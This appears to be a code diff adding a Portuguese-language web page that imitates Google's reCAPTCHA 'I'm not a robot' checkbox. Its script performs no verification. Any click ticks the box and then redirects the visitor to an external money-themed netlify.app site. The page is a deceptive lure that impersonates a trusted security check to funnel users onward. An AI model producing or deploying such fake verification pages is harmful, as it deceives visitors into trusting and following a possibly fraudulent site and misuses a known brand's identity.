@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificação</title>
+  <meta name="description" content="Confirme que você não é um robô para continuar." />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #f1f2f4;
+      font-family: Roboto, "Helvetica Neue", Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+
+    h1 {
+      color: #202124;
+      font-size: 28px;
+      font-weight: 400;
+      line-height: 1.3;
+      text-align: center;
+      max-width: 480px;
+      margin-bottom: 40px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 480px;
+      background-color: #ffffff;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+      overflow: hidden;
+    }
+
+    .checkbox-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 24px 20px;
+      cursor: pointer;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .checkbox-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .checkbox-box {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #9ca3af;
+      border-radius: 2px;
+      background-color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: border-color 0.2s ease;
+    }
+
+    .checkbox-box.checked {
+      border-color: #4285f4;
+    }
+
+    .checkbox-box svg {
+      display: none;
+    }
+
+    .checkbox-box.checked svg {
+      display: block;
+    }
+
+    .checkbox-label {
+      color: #202124;
+      font-size: 16px;
+    }
+
+    .recaptcha-brand {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .recaptcha-brand svg {
+      width: 36px;
+      height: 36px;
+    }
+
+    .recaptcha-text {
+      margin-top: 4px;
+      font-size: 11px;
+      color: #6b7280;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #e5e7eb;
+      margin: 0;
+    }
+
+    .footer {
+      display: flex;
+      align-items: center;
+      padding: 10px 20px;
+    }
+
+    .footer a {
+      color: #6b7280;
+      font-size: 11px;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .footer .sep {
+      color: #6b7280;
+      font-size: 11px;
+      margin: 0 8px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Por favor, confirme que você não é um robô para continuar</h1>
+
+  <div class="card">
+    <div class="checkbox-row" id="verifyRow">
+      <div class="checkbox-left">
+        <div class="checkbox-box" id="checkboxBox">
+          <!-- Check icon -->
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4285f4" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+        <span class="checkbox-label">Não sou um robô</span>
+      </div>
+
+      <div class="recaptcha-brand">
+        <!-- Shield icon -->
+        <svg viewBox="0 0 24 24" fill="none" stroke="#4285f4" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+        </svg>
+        <span class="recaptcha-text">reCAPTCHA</span>
+      </div>
+    </div>
+
+    <hr class="divider" />
+
+    <div class="footer">
+      <a href="#">Privacidade</a>
+      <span class="sep">-</span>
+      <a href="#">Termos</a>
+    </div>
+  </div>
+
+  <script>
+    const verifyRow = document.getElementById('verifyRow');
+    const checkboxBox = document.getElementById('checkboxBox');
+
+    verifyRow.addEventListener('click', function () {
+      if (checkboxBox.classList.contains('checked')) return;
+
+      checkboxBox.classList.add('checked');
+
+      setTimeout(function () {
+        window.location.href = 'https://subwaymoneyv.netlify.app/';
+      }, 1200);
+    });
+  </script>
+</body>
+</html>
